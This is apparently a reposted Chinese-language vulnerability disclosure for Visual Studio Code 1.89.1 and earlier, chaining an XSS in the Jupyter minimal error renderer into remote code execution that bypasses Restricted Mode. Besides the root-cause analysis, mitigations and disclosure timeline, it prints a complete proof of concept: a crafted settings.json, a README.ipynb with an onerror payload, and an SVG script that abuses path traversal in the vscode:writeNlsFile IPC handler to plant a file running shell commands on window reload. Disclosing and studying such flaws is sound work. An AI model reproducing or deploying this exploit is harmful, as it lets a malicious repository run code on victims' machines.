#  突破限制模式：Visual Studio Code 中的 XSS 到 RCE   
 Ots安全   2025-05-21 11:19  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
2024 年 4 月，我发现了 Visual Studio Code（VS Code <= 1.89.1）中一个高严重性漏洞，该漏洞允许攻击者将跨站点脚本 (XSS) 漏洞升级为完全远程代码执行 (RCE)——即使在受限模式下也是如此。  
  
桌面版 Visual Studio Code 运行在 Electron 上，渲染进程被沙盒化，并通过Electron 的 IPC 机制与主进程通信。  
  
Jupyter 笔记本新引入的最小错误渲染vscode-app模式中存在一个 XSS 漏洞，允许在笔记本渲染器的 WebView中执行任意 JavaScript 代码。.ipynb如果用户启用了该设置，打开一个精心设计的文件即可触发此漏洞；如果用户settings.json在 VS Code 中打开一个包含精心设计文件的文件夹，并在其中打开一个恶意 ipynb 文件，则可触发此漏洞。即使启用了受限模式（这是用户未明确信任的工作区的默认设置），此漏洞也可能被触发。  
  
在这篇文章中，我们将介绍该漏洞的工作原理以及它如何绕过 VS Code 的限制模式。  
  
漏洞详情  
  
Visual Studio 的默认安装为 Jupyter Notebook 提供了一些内置支持，并为一些常见的输出类型提供了默认渲染器。这些渲染器的源代码可以在 中找到  
extensions/notebook-renderers/src/index.ts。对于 类型的单元格  
application/vnd.code.notebook.error，渲染器调用renderError函数，该函数又调用formatStackTrace位于 中的stackTraceHelper.ts。该函数进一步调用linkify位于同一文件中的 ，将对特定单元格中行的引用转换为 VS Code 中的可点击链接。如果启用了最小错误渲染模式，程序将把结果从  
formatStackTrace传递到  
createMinimalError，后者执行一些进一步的处理并将结果附加到 webview 的 DOM 。此处复制了带有注释的代码相关摘录。  
  
渲染错误：  
  
```
function renderError(  outputInfo: OutputItem,  outputElement: HTMLElement,  ctx: IRichRenderContext,  trustHtml: boolean // falseif workspace is not trusted): IDisposable {    // ...if (err.stack) {    const minimalError = ctx.settings.minimalError && !!headerMessage?.length;    outputElement.classList.add('traceback');    const { formattedStack, errorLocation } = formatStackTrace(err.stack);        // ...    if (minimalError) {      createMinimalError(errorLocation, headerMessage, stackTraceElement, outputElement);    } else {      // ...    }  } else {    // ...  }  outputElement.classList.add('error');return disposableStore;}
```  
  
  
formatStackTrace 和 linkify：  
  
```
exportfunctionformatStackTrace(stack: string): { formattedStack: string; errorLocation?: string } {let cleaned: string;// ...if (isIpythonStackTrace(cleaned)) {    return linkifyStack(cleaned);  }}const cellRegex = /(?<prefix>Cell\s+(?:\u001b\[.+?m)?In\s*\[(?<executionCount>\d+)\],\s*)(?<lineLabel>line (?<lineNumber>\d+)).*/;functionlinkifyStack(stack: string): { formattedStack: string; errorLocation?: string } {const lines = stack.split('\n');let fileOrCell: location | undefined;let locationLink = '';for (const i in lines) {    const original = lines[i];    if (fileRegex.test(original)) {      // ...    } elseif (cellRegex.test(original)) {      fileOrCell = {        kind: 'cell',        path: stripFormatting(original.replace(cellRegex, 'vscode-notebook-cell:?execution_count=$<executionCount>'))      };      const link = original.replace(cellRegex, `<a href=\'${fileOrCell.path}&line=$<lineNumber>\'>line $<lineNumber></a>`); // [1]      lines[i] = original.replace(cellRegex, `$<prefix>${link}`);      locationLink = locationLink || link; // [2]      continue;    }        // ...  }const errorLocation = locationLink; // [3]return { formattedStack: lines.join('\n'), errorLocation };}
```  
  
  
创建最小错误：  
  
```
functioncreateMinimalError(errorLocation: string | undefined, headerMessage: string, stackTrace: HTMLDivElement, outputElement: HTMLElement) {const outputDiv = document.createElement('div');const headerSection = document.createElement('div');  headerSection.classList.add('error-output-header');if (errorLocation && errorLocation.indexOf('<a') === 0) {    headerSection.innerHTML = errorLocation; // [4]  }const header = document.createElement('span');  header.innerText = headerMessage;  headerSection.appendChild(header);  outputDiv.appendChild(headerSection);// ...  outputElement.appendChild(outputDiv);}
```  
  
  
在[1]和 处[2]，代码尝试将诸如 之类的序列  
Cell In [1], line 6（可选地使用 ANSI 转义序列）转换为用于与表单链接的 HTML 标签  
<a href=vscode-notebook-cell:?execution_count=1&line=6>line 6</a>，并在 处将 errorLocation 变量设置为此 HTML [3]。至关重要的是，它使用的正则表达式末尾的通配符会吞噬行号之后的任何文本，但紧接在Cell In序列之前的任何文本都不会受到该replace操作的影响。因此，像 ipynb. 中的输入  
LOLZTEXTHERECell In [1], line 6会导致无效标记  
LOLZTEXTHERE<a href=LOLZTEXTHEREvscode-notebook-cell:?execution_count=1&line=6>line 6</a>。  
  
在 中  
createMinimalError，如果  
errorLocation设置了 并以 开头<a，则它被视为由  
formatStackTrace函数生成的链接，因此直接分配给  
headerSection.innerHTML。无论工作区是否受信任，此元素都会添加到输出 DOM 中。但是，由于我们可以部分控制标记的formatStackTrace生成（包括字符串的开头），因此我们可以创建一个带有堆栈跟踪的笔记本文件  
<a><img src onerror=console.log(123)>Cell In [1], line 6，这将导致 的值为errorLocation。  
<a><img src onerror=console.log(123)><a href=<a><img[etc]由于这满足以 开头的条件<a>，它将被插入到  
headerSection.innerHTMLwebview 中并在其中呈现，从而导致 JavaScript 运行并123记录到控制台。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeE4A70ZJcGMWKhyvy6SjkWIbF0DrRicicXF7C8WCl0OOjtg6ymbDCKejlQLg22OgRyeJDhx7VpHYMw/640?wx_fmt=png&from=appmsg "")  
  
升级到 RCE  
  
该 XSS 漏洞会导致在源下的 iframe 中执行代码vscode-app，该 iframe 是位于源下主工作台窗口下的框架  
vscode-file。主工作台窗口包含一个vscode.ipcRenderer对象，该对象使渲染器框架能够向主框架发送 IPC 消息，以便执行文件系统操作、在 PTY 中创建和执行命令等等。要访问此对象，我们需要找到一种在  
vscode-file源内执行代码的方法。协议处理程序的代码  
vscode-file位于src/vs/platform/protocol/electron-main/protocolMainService.ts中，相关部分摘录如下：  
  
```
private readonly validExtensions = new Set(['.svg', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.mp4']); // https://github.com/microsoft/vscode/issues/119384    private handleResourceRequest(request: Electron.ProtocolRequest, callback: ProtocolCallback): void {    const path = this.requestToNormalizedFilePath(request);    let headers: Record<string, string> | undefined;    if (this.environmentService.crossOriginIsolated) {      if (basename(path) === 'workbench.html' || basename(path) === 'workbench-dev.html') {        headers = COI.CoopAndCoep;      } else {        headers = COI.getHeadersFromQuery(request.url);      }    }    // first check by validRoots    if (this.validRoots.findSubstr(path)) {      return callback({ path, headers });    }    // then check by validExtensions    if (this.validExtensions.has(extname(path).toLowerCase())) {      return callback({ path });    }    // finally block to load the resource    this.logService.error(`${Schemas.vscodeFileResource}: Refused to load resource ${path} from ${Schemas.vscodeFileResource}: protocol (original URL: ${request.url})`);    return callback({ error: -3/* ABORTED */ });  }
```  
  
  
为了根据协议加载文件vscode-file，它们必须位于 VS Code 应用程序安装目录中，或者具有一组有效扩展名之一。.svg是一个有效扩展名，可以包含在加载时将执行的 JavaScript 代码<iframe>。我们可以将 SVG 文件包含到我们的恶意代码库中，并通过笔记本 webview 中的许多 DOM 元素获取对存储目录的引用，这些元素包含对当前目录的引用（PoC 使用<base>标签的href属性）。  
  
在 SVG 文件中，  
top.vscode.ipcRenderer可用于调用主进程的 IPC 处理程序。特别是两个处理程序，  
vscode:readNlsFile和  
vscode:writeNlsFile，被发现容易受到目录遍历攻击，使攻击者能够读取和写入进程在文件系统上有权访问的任何文件。PoC 利用这一点在 Windows 和 macOS 上通过写入 来执行代码  
<vscode app root>/out/node_modules/graceful-fs.js，该文件默认情况下不存在，但 VS Code 在加载窗口时会尝试导入（我们可以通过发送  
vscode:reloadWindowIPC 消息立即触发）。在 Linux 上，可以通过类似的方式通过写入  
.bashrcetc来实现代码执行。  
  
概念验证：  
  
该 PoC 是一个包含 VS Code 工作区的恶意文件夹。要触发此漏洞，请使用“打开文件夹”命令在 VS Code 中打开该文件夹，然后打开文件夹中的 README.ipynb 文件。此 PoC 已在 Windows 和 macOS 版本的 VS Code 上进行了测试。恶意存储库的文件结构如下：  
  
```
not_sus_repo├── .vscode│ └── settings.json├── README.ipynb└── icon.svg
```  
  
  
vscode/settings.json：  
  
```
{    "notebook.output.minimalErrorRendering": true}
```  
  
  
README.ipynb：  
  
```
{"cells": [  {   "cell_type": "code",   "execution_count": 1,   "metadata": {},   "outputs": [    {     "data": {      "application/vnd.code.notebook.error": {       "message": "error",       "name": "name",       "stack": "<a><img src onerror=\"var root=document.getElementsByTagName('base')[0].href;root=root.replace('https://file+.vscode-resource.vscode-cdn.net/','vscode-file://vscode-app/');var iframe=document.createElement('iframe');iframe.src=root+'icon.svg',iframe.style.display='none',document.body.appendChild(iframe);\">Cell \u001b[1;32mIn[1], line 6"      }     },     "metadata": {},     "output_type": "display_data"    }   ],   "source": [    "def make_big_err(i):\n",    " if i <= 0:\n",    " raise Exception()\n",    " make_big_err(i-1)\n",    "\n",    "make_big_err(10)"   ]  } ]}
```  
  
icon.svg：  
  
```
<svg height="100" width="100" xmlns="http://www.w3.org/2000/svg">    <circler="45"cx="50"cy="50"fill="red" />    <script>      asyncfunctionexp() {        const pathSep = top.vscode.process.platform === 'win32' ? '\\' : '/';        const a = top.vscode.context.configuration().userDataDir;        let b = top.vscode.context.configuration().appRoot;        let payload = top.vscode.process.platform === 'win32' ? 'start calc.exe' : 'open -a Calculator.app';        if (b[1] === ':') {          b = b.slice(2);        }        const subPath = `clp${pathSep}${('..' + pathSep).repeat(15)}${b}${pathSep}out${pathSep}node_modules${pathSep}graceful-fs.js`;        await top.vscode.ipcRenderer.invoke('vscode:writeNlsFile', `${a}${pathSep}${subPath}`, `require("child_process").exec("${payload}");`);        top.vscode.ipcRenderer.send('vscode:reloadWindow');      }      exp();    </script>  </svg>
```  
  
  
建议的缓解措施  
  
在 中  
createMinimalError，确保  
errorLocation仅包含<a>具有指定 URI 格式的标签，然后再分配给  
headerSection.innerHTML  
  
在笔记本渲染器 webview 中使用内容安全策略，以确保在受限模式下仅运行受信任的脚本。  
  
演示  
  
现在是演示时间。  
  
  
时间线  
  
2024-07-03 供应商披露  
  
2024-07-03 首次联系供应商  
  
2024-07-10 与供应商共享了另外两个 POC  
  
2024-08-02 供应商回复“此案例被评估为低严重性，不符合 MSRC 立即服务的标准，因为如果没有大量的用户交互（即接受保存到攻击者控制的位置的提示），RCE 就不再可能。”  
  
2025-05-14 公开披露  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
  
